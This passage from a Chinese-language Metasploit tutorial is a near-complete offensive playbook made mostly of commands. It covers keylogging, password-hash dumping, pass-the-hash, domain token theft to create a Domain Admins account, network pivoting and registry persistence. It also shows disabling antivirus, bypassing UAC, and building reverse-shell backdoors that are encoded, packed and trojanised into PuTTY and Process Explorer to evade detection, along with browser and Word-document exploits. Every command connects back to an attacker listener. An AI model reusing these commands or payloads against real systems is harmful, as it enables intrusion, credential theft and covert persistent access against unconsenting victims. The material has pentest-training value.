<p>获取屏幕截图：<code>screenshot</code></p>
<p>获取系统信息：<code>sysinfo</code></p>
<p>获取键盘记录：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; ps  #查看目标机器进程，假设发现explorer.exe的进程号为1668:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; migrate 1668  #插入该进程</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run post/windows/capture/keylog_recorder  #运行键盘记录模块，将击键记录保存到本地txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cat /root/.msf3/loot/*****.txt  #查看结果</span><br></span></code></pre></div></div>
<p>获取系统账号密码：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; use priv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run post/windows/gather/hashdump</span><br></span></code></pre></div></div>
<p>当获取到密码的hash之后无法破解出明文密码且无法直接使用hash登陆，需要使用pass-the-hash技术：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use windows/smb/psexec</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set PAYLOAD windows/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LHOST 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LPORT 443</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOST 192.168.1.130</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set SMBPass aad3b435b51404eeaad3b435b51404ee:b75989f65d1e04af7625ed712ac36c29</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span></code></pre></div></div>
<p>获取到系统权限后我们可以新建一个普通账号，然后使用此账号执行我们的后门：</p>
<p>在目标机器上执行：<code>net uaer hacker pass /add</code></p>
<p>本地生成一个后门程序：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfpayload windows/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LHOST=192.168.1.111 LPORT=443 X &gt;payload.exe</span><br></span></code></pre></div></div>
<p>将payload.exe拷贝到目标机器然后使用新建立的账号执行,本地执行端口监听，等待来自目标机器连接：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfcli multi/handler PAYLOAD=windows/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LHOST=192.168.1.111 LPORT=443</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">use priv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">getsystem</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">getuid</span><br></span></code></pre></div></div>
<p>至此取得SYSTEM权限</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="2令牌模拟">2、令牌模拟：<a href="#2令牌模拟" class="hash-link" aria-label="2、令牌模拟：的直接链接" title="2、令牌模拟：的直接链 接">​</a></h3>
<p>当有域控账户登陆至服务器时可使用令牌模拟进行渗透取得域控权限，之后登陆其他机器时不需要登陆密码。</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; ps  # 查看目标机器进程，找出域控账户运行的进程ID，假如发现PID为380</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; steal_token 380</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#有时ps命令列出的进程中可能不存在域控账户的进程，此时使用incognito模块查看可用token：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; use incognito</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; list_tokens –u  #列出可用token，假如找到域控token</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; impersonate_token SNEAKS.IN\\ihazdomainadmin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; add_user hacker password –h 192.168.1.50 #在域控主机上添加账户</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; add_group_user “Domain Admins” hacker –h 192.168.1.50  #将账户添加至域管理员组</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="3内网渗透">3、内网渗透：<a href="#3内网渗透" class="hash-link" aria-label="3、内网渗透：的直接链接" title="3、内网渗透：的直接链接">​</a></h3>
<p>当取得同网段内一台主机的权限后可以进一步渗透网内其他主机：</p>
<p>例子：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run get_local_subnets  #查看网段/子网</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Local subnet: 192.168.33.0/255.255.255.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; background  #转入后台运行</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; route add 192.168.33.0 255.255.255.0 1  #本地添加路由信息</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; route print #查看添加的信息</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use linux/samba/lsa_transnames_heap   #准备向内网目标主机进攻</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload linux/x86/shell/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LHOST 10.10.1.129 #此处为attacking主机的外网IP </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LPORT 8080</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOST 192.168.33.132 #内网目标主机</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span></code></pre></div></div>
<p>也可以使用自动式添加路由模块：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; load auto_add_route</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; exploit</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="4meterpreter脚本">4、Meterpreter脚本：<a href="#4meterpreter脚本" class="hash-link" aria-label="4、Meterpreter脚本：的直接链接" title="4、Meterpreter脚本：的直接链接">​</a></h3>
<p>使用run scriptname 方式执行</p>
<p>vnc脚本,获取远程机器vnc界面控制</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run vnc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run screen_unlock</span><br></span></code></pre></div></div>
<p>进程迁移</p>
<p>当攻击成功后将连接进程从不稳定进程（如使用浏览器溢出漏洞exp进行攻击时浏览器可能会被目标关闭）迁移至稳定进程(explorer.exe)，保持可连接。</p>
<p>例子：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run post/windows/manage/migrate</span><br></span></code></pre></div></div>
<p>（在64位win7中migrate需要管理员权限执行后门才能成功，而migrate前后获取的权限是有差异的。）</p>
<p>关闭杀毒软件</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run killav   （这个脚本要小心使用，可能导致目标机器蓝屏死机。）</span><br></span></code></pre></div></div>
<p>获取系统密码hash</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run hashdump</span><br></span></code></pre></div></div>
<p>（64位win7下需要管理员权限执行后门且先getsystem，然后使用</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">run  post/windows/gather/hashdump来dump hash成功率更高。</span><br></span></code></pre></div></div>
<p>而且如果要使用shell添加系统账户的话win7下得先：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">run post/windows/escalate/bypassuac  ，不然可能不会成功。）</span><br></span></code></pre></div></div>
<p>获取系统流量数据</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run packtrecorder –i 1</span><br></span></code></pre></div></div>
<p>直捣黄龙</p>
<p>可以干很多事情：获取密码，下载注册表，获取系统信息等</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run scraper</span><br></span></code></pre></div></div>
<p>持久保持</p>
<p>当目标机器重启之后仍然可以控制</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run persistence –X –i 50 –p 443 –r 192.168.1.111</span><br></span></code></pre></div></div>
<p>-X 开机启动  -i连接超时时间 –p端口 –rIP</p>
<p>下次连接时：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use multi/handler</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload windows/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LPOST 443</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LHOST 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span></code></pre></div></div>
<p>(会在以下位置和注册表以随机文件名写入文件等信息，如：</p>
<p>C:\Users\YourtUserName\AppData\Local\Temp\MXIxVNCy.vbs</p>
<p>C:\Users\YourtUserName\AppData\Local\Temp\radF871B.tmp\svchost.exe</p>
<p>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DjMzwzCDaoIcgNP)</p>
<p>POST整合模块</p>
<p>可实现同时多个session操作</p>
<p>例子：获取hash</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; run post/windows/gather/hashdump</span><br></span></code></pre></div></div>
<p>其他还有很多，使用TAB键补全看下就知道</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="5升级command-shell">5、升级command shell<a href="#5升级command-shell" class="hash-link" aria-label="5、升级command shell的直接链接" title="5、升级command shell的直接链接">​</a></h3>
<p>例子：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfconsole</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; search ms08_067</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use windows/smb/ms08_067_netapi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set PAYLOAD windows/shell/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set TARGET 3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">setg LHOST 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">setg LPORT 8080</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit –z  #后台运行，如果此处未使用-z参数，后面可以按CTRL-Z转到后台</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sessions –u 1  #升级shell，必须前面使用setg设定</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sessions –i 2</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="6使用railgun操作windows-apis">6、使用Railgun操作windows APIs<a href="#6使用railgun操作windows-apis" class="hash-link" aria-label="6、使用Railgun操作windows APIs的直接链接" title="6、使用Railgun操作windows APIs的直接链接">​</a></h3>
<p>例子：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter&gt; irb</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt;&gt;client.railgun.user32.MessageBoxA(o,”hello”,”world”,”MB_OK”)</span><br></span></code></pre></div></div>
<p>在目标机器上会弹出一个标题栏为world和内容为hello的窗口</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="七避开杀软">七．避开杀软<a href="#七避开杀软" class="hash-link" aria-label="七．避开杀软的直接链接" title="七．避开杀软的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="1使用msfpayload创建可执行后门">1、使用msfpayload创建可执行后门：<a href="#1使用msfpayload创建可执行后门" class="hash-link" aria-label="1、使用msfpayload创建可执行后门：的直接链接" title="1、使用msfpayload创建可执行后门：的直接链接">​</a></h3>
<p>例子：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfpayload windows/shell_reverse_tcp 0  #查看选项</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=31337 X &gt; /var/www/payload1.exe</span><br></span></code></pre></div></div>
<p>然后本机监听端口</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use exploit/multi/handler</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show options</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set PAYLOAD windows/shell_reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LHOST 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LPORT 31337</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="2过杀软---使用msfencode编码后门">2、过杀软---使用msfencode编码后门：<a href="#2过杀软---使用msfencode编码后门" class="hash-link" aria-label="2、过杀软---使用msfencode编码后门：的直接链接" title="2、过杀软---使用msfencode编码后门：的直接链接">​</a></h3>
<p>msfencode –l  #列出可用编码器</p>
<p>例子：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=31337 R |msfencode –e x86/shikata_ga_nai –t exe &gt; /var/www/payload2.exe</span><br></span></code></pre></div></div>
<p>使用 R参数作为raw输出至管道，再经过msfencode处理，最后导出。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="3多次编码">3、多次编码：<a href="#3多次编码" class="hash-link" aria-label="3、多次编码：的直接链接" title="3、多次编码：的直接链接">​</a></h3>
<p>例子：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.111 LPORT=31337 R | \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    msfencode –e x86/shikata_ga_nai –c 5 –t raw | \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    msfencode –e x86/alpha_upper –c 2 –t raw | \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    msfencode –e x86/shikata_ga_nai –c 5 –t raw | \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    msfencode –e x86/countdown –c 5 –t exe –o /var/www/payload3.exe</span><br></span></code></pre></div></div>
<p>简单编码被杀机会很大，使用多次编码效果更好，这里一共使用了17次循环编码。</p>
<p>（题外：经测试，1：使用此命令生成的后门也被MSE杀到；2：未编码的后门或编码次数较  少的后门可以直接被秒杀；3：windows/x64/meterpreter/reverse_tcp生成的后门未经任何处理仍然不被杀，看来杀毒软件傻逼了；4：x86编码器编码的后门在64位机器上无法执行；5：360有个沙箱功能，后门文件右键选择“在360隔离沙箱中运行”，msf照样可以连接并操作，看来隔离沙箱功能有限。）</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="4自定义可执行程序模板">4、自定义可执行程序模板：<a href="#4自定义可执行程序模板" class="hash-link" aria-label="4、自定义可执行程序模板：的直接链接" title="4、自定义可执行程序模板：的直接链接">​</a></h3>
<p>msfencode默认使用data/templates/templates.exe（msf v4在templates目录下有针对不同平台的不同模板）作为可执行程序的模板，杀毒厂商也不是傻逼，所以这里最好使用自定义模板，如：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">wget http://download.sysinternals.com/Files/ProcessExplorer.zip</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cd work</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">unzip ProcessExplorer.zip</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cd ..</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8080 R | msfencode –t exe –x work/procexp.exe –o /var/www/pe_backdoor.exe –e x86/shikata_ga_nai –c 5</span><br></span></code></pre></div></div>
<p>在目标机器上运行，然后本地使用msfcli监听端口等待反弹连接：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfcli exploit/multi/handler PAYLOAD=windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8080 E</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="5暗度陈仓猥琐执行payload">5、暗度陈仓—猥琐执行payload：<a href="#5暗度陈仓猥琐执行payload" class="hash-link" aria-label="5、暗度陈仓—猥琐执行payload：的直接链接" title="5、暗度陈仓—猥琐执行payload：的直接链接">​</a></h3>
<p>绑定payload至一个可执行文件，让目标不知不觉间中招，以putty.exe为例：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8080 R | msfencode –t exe –x putty.exe -o /var/www/putty_backdoor.exe –e x86/shikata_ga_nai –k –c 5</span><br></span></code></pre></div></div>
<p>假如选择一个GUI界面的程序作为绑定目标并且不使用-k选项，则目标执行此程序的时候不会弹出cmd窗口，-k选项的作用是payload独立于模板软件的进程运行。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="6加壳">6、加壳：<a href="#6加壳" class="hash-link" aria-label="6、加壳：的直接链接" title="6、加壳：的直接链接">​</a></h3>
<p>msfencode部分编码器会增加程序体积，这时可使用壳（packer）来压缩程序，“带套之后 更保险”，例如UPX ：</p>
<p><code>apt-get install upx</code></p>
<p>最新版可到sf.net下载</p>
<p>使用方法：</p>
<p><code>upx -5 /var/www/payload3.exe</code></p>
<p>还有另外一个工具msfvenom结合了msfpayload和msfencode的功能，使用起来更省心，亲，一定要试试哦！过杀软总结起来就是多次编码和使用多种壳，终极大法就是使用自己编写的后门（市面上没有，被杀几率更低）。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="八使用用户端攻击方式client-side-attacks">八．使用用户端攻击方式(client-side attacks)<a href="#八使用用户端攻击方式client-side-attacks" class="hash-link" aria-label="八．使用用户端攻击方式(client-side attacks)的直接链接" title="八．使用用户端攻击方式(client-side attacks)的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="1组合型攻击">1、组合型攻击<a href="#1组合型攻击" class="hash-link" aria-label="1、组合型攻击的直接链接" title="1、组合型攻击的直接链接">​</a></h3>
<p>主要指利用多种途径包括社会工程学方式攻击目标机器上安装的带有漏洞的程序如浏览 器，pdf阅读器，office软件等，最终获取系统权限。</p>
<p>基于浏览器的攻击：</p>
<p>例子：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use windows/browser/ms10_002_aurora</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload windows/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set SRVPORT 80</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set URIPATH /</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LHOST 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LPORT 443</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit –z</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sessions –i 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run migrate</span><br></span></code></pre></div></div>
<p>或者:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use windows/browser/ms10_002_aurora</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show advanced</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set ReverseConnectRetries 10</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set AutoRunScript migrate –f</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">use priv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">getsystem</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="2文件格式exploit">2  、文件格式exploit<a href="#2文件格式exploit" class="hash-link" aria-label="2、文件格式exploit的直接链接" title="2、文件格式exploit的直接链接">​</a></h3>
<p>利用文件格式的漏洞达到溢出的目的，比如PDF，word，图片等。</p>
<p>例子：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use windows/fileformat/ms11_006_createsizeddibsection</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">info</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload windows/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LHOST 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LPORT 443</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span></code></pre></div></div>
<p>此时会生成一个msf.doc的word文档，在目标机器上打开此文档，然后本机监听端口等待反弹连接：</p>
